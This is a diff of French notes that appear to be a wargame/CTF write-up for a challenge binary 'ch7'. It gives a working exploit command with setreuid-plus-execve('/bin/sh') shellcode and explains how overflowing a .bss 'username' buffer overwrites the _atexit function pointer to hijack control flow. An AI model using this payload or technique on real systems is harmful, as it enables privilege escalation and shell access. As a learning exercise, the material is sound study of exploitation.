@@ -119,3 +119,37 @@ Shellcode (39 octets) :
 
 `./ch7 $(python2 -c "print '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\x66\xbb\xb7\x04\x66\xb9\xb7\x04\xcd\x80\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\xb0\x0b\xcd\x80' + 'A' * (512 - 39) + '\x40\xa0\x04\x08'")
 `
+### A retenir
+
+.bss contient les variables globales non initialisées (ou initialisées à zéro).
+remplir username
+
+déborder dans _atexit
+
+**Un overflow sur un pointeur de fonction = contrôle du flux d’exécution**
+Si on changes _atexit => on change où le programme saute
+
+
+```
+0x0804a040 : username[512 bytes]
+0x0804a240 : _atexit (adresse d’une fonction)
+
+```
+On rempli username avec ton shellcode
+
+(shellcode = code machine prêt à être exécuté)
+On deborde de 512 octets on ecrase _atexit
+
+On met dedans l’adresse :
+0x0804a040
+
+
+Le programme fait :
+_atexit(0);
+
+
+Donc il fait :
+
+saute à l’adresse 0x0804a040 → début du shellcode
+exécute les instructions → spawn /bin/sh
+
